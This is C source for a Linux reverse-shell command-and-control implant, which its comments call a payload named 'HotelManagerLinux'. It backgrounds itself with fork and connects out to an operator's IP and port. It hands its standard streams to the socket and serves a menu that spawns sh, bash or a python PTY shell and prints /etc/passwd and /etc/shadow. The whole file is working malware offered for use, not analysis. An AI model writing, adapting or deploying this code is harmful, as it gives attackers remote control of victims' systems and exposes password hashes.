//this linux client will be renamed when a cool name is found
//connect to open socket and read from socket for command and control. quit on failed connect
//fork to begin with to background the c2 portion of the payload

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>

#include <netinet/in.h>
#include <sys/types.h>
#include <sys/socket.h>

#define DEFIPADDR "127.0.0.1"	//default ip if nothing is given
#define DEFPORT 1234			//default port if nothing is given

int main(int argc, char *argv[])
{
    struct sockaddr_in sa;

	//here we will set up our default listen server information
    sa.sin_family = AF_INET;						//AF_INET = Address Family is IPv4
	sa.sin_addr.s_addr = inet_addr(DEFIPADDR);		//convert our ip string to a host byte arrangement
    sa.sin_port = htons(DEFPORT);					//turns port into network byte format (find out what that means)

	if(argc == 2)
	{
		if(!strcmp("-h", argv[1]))
		{
			printf("Usage: ./linuxClient <IP> <PORT>\n");
			return 1;
		}
		else
			sa.sin_addr.s_addr = inet_addr(argv[1]);	//convert our command line argument ip type and set for sockaddr
	}
	else if(argc == 3)
	{
		sa.sin_addr.s_addr = inet_addr(argv[1]);	//convert our command line argument ip type and set for sockaddr
		int port = atoi(argv[2]);					//convert command line string to int
	    sa.sin_port = htons(port);					//turns command line argument to port
	}
	else if(argc > 3)
	{
		printf("usage error: ./linuxClient <IP> <PORT>");
		return -1;
	}

	//this fork and exit portion are used to background the running process
	int pid = fork();	//fork process and return pid to pid (0 to child, actual pid to parent)

	if(pid)
		return 1;
	//now we are ready to connect with our background running process


	char buff[2048];
	char command[2048];

    int sock;




	sock = socket(AF_INET, SOCK_STREAM, 0);	//sets up our socket descripter

//	printf("Socket descripter value: %d\n", sock); //this is some file descriptor testing

	int check = connect(sock, (struct sockaddr *)&sa, sizeof(sa));	//attempt to connect


	if(check == -1)	//quit on failed connect (value of -1)
		printf("Failed to connect to socket, exiting\n");
	else
	{
		//printf("%d\n", check); //to check what check value is
		dup2(sock, 0);	//stdin moved to socket
		dup2(sock, 1);	//stdout moved to socket
		dup2(sock, 2);	//stderr moved to socket

		//sending output to handler to show connection
		strcpy(buff, "Connection made! Welcome! This is a linux client calling back\n");
		write(sock, buff, strlen(buff));
		//now we will start getting into the gritty stuff


		int check = 1;	//this will be a prompt for handler
		char *prompt = "HotelManagerLinux> ";	//prompt for handler (fill with payload name)

		//THE FOLLOWING WILL BE THE ALLOCATION AND WRITE TO HELP MENU FOR THE MAIN PAYLOAD
		char help[32][1024];
		strcpy(help[0],	 "\n----------HELP MENU----------\n\n");
		strcpy(help[1],	 "ls - Print contents of directory\n");
		strcpy(help[2],	 "pwd -	print working directory\n");
		strcpy(help[3],	 "shell - drop into sh shell\n");
		strcpy(help[4],  "shell2 - drop into bash shell\n");
		strcpy(help[5],  "ushell - drop the final load\n");
		strcpy(help[6],  "pid - print the working process id\n");
		strcpy(help[7],  "date - get the system datetime\n");
		strcpy(help[8],  "who - print the current users and their ip address\n");
		strcpy(help[9],  "whoami - print the current username\n");
		strcpy(help[10], "passwd - print the passwd file to screen\n");
		strcpy(help[11], "shadow - attempt to print the shadow password to the screen\n");
		strcpy(help[12], "FILLER\n");
		strcpy(help[13], "clear - clear the current screen\n");
		strcpy(help[14], "exit - quit from payload\n");
		strcpy(help[15], "\n------------------------------\n\n");
		//HELP MENU INFO OVER HERE

		char *error = "COMMAND NOT RECOGNIZED\n";
		char nl[3]	= "\n";
		char num[32];

		while(check)
		{
			for(int i = 0; i < 2048; i++)
				command[i] = 0;	//reset command to nulls so that no past command is left over

			write(sock, prompt, strlen(prompt));	//write the prompt to buffer
			read(sock, command, sizeof(command));	//read the command from buffer

			//write(sock, command, strlen(command));	//for testing writing command back to handler

			command[strlen(command) -1] = 0;	//take care of the newline

			if(!strcmp("exit", command))
				check = 0;	//exit on this

			else if(!strcmp("shell", command))
				system("/bin/sh");	//fork into a sh shell. return here on exit

			else if(!strcmp("shell2", command))
				system("/bin/bash");	//fork into a bash shell. return here on exit

			else if(!strcmp("ushell", command))
			{
				//cool system command incoming
				system("python -c 'import pty; pty.spawn(\"/bin/bash\")'");	//fork into a full bash shell. return here on exit
			}

			else if(!strcmp("help", command))
				for(int i = 0; i < 17; i++)
					write(sock, help[i], strlen(help[i]));	//write help menu

			else if(!strcmp("ls", command))
				system("/bin/ls");	//print current directory contents

			else if(!strcmp("pwd", command))
				system("pwd");		//print current working directory

			else if(!strcmp("pid", command))
			{
				int p = getpid();	//returns the running process id to variable p
				sprintf(num, "PID: %d\n", p);	//writes the integer to a string so we can write to socket
				write(sock, num, strlen(num));	//writes string representation of integer to the socket
			}

			else if(!strcmp("date", command))
				system("date");

			else if(!strcmp("who", command))
				system("w -i");		//display the current users with ip address as the from instead of hostnames

			else if(!strcmp("whoami", command))
				system("whoami");	//display the current running username

			else if(!strcmp("passwd", command))
				system("cat /etc/passwd");

			else if(!strcmp("shadow", command))
				system("cat /etc/shadow");

			else if(!strcmp("clear", command))	//clears the C2 screen
				system("clear");

			else if(!strcmp("", command));		//do nothing on empty command

			else
				write(sock, error, strlen(error));	//write error message if commnd is not recognized
		}


		strcpy(buff, "\nALRIGHT SEE YOU LATER!\n");	//on exit print a nice message
		write(sock, buff, strlen(buff));			//write that message to the socket
	}

	return 0;
}
